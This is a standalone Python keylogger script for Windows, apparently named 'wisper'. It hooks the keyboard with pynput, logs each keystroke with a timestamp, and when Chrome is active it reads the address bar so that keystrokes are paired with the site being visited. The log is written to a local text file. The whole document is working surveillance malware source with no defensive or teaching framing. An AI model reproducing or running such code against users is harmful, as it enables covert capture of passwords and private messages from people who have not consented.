from pynput import keyboard
import os
import time
import uiautomation as automation
import psutil, win32process, win32gui

def active_window_process_name():
    pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    return psutil.Process(pid[-1]).name()


def on_press(key):
    try:
        d = time.strftime("%Y/%m/%d,%H:%M:%S")
        url = ''
        if active_window_process_name() == 'chrome.exe':
            url = ',' + get_current_url()
        log.append(key.char + ',' + d + url + '\n')
    except AttributeError:
        d = time.strftime("%Y/%m/%d,%H:%M:%S")
        if key == keyboard.Key.space:
            log.append(' ' + ',' + d + url + '\n')
    if key == keyboard.Key.esc:
        # Stop listener
        raise keyboard.Listener.StopException

def start_wisper():
    if not os.path.exists("logs"):
        os.makedirs("logs")
    global log
    log = []
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    date = time.strftime("Log_%Y-%m-%d_%H-%M-%S")
    with open('logs/' + 'info_log' + ".txt", 'a') as filek:
        for key in log:
            filek.write(str(key))

def get_current_url():
    control = automation.GetFocusedControl()
    controlList = []
    while control:
        controlList.insert(0, control)
        control = control.GetParentControl()
    if len(controlList) == 1:
        control = controlList[0]
    else:
        control = controlList[1]
    address_control = automation.FindControl(control, lambda c, d: isinstance(c, automation.EditControl) and "Address and search bar" in c.Name)
    return str(address_control.CurrentValue())

if __name__ == "__main__":
    try:
        start_wisper()
    except:
        filek.close()

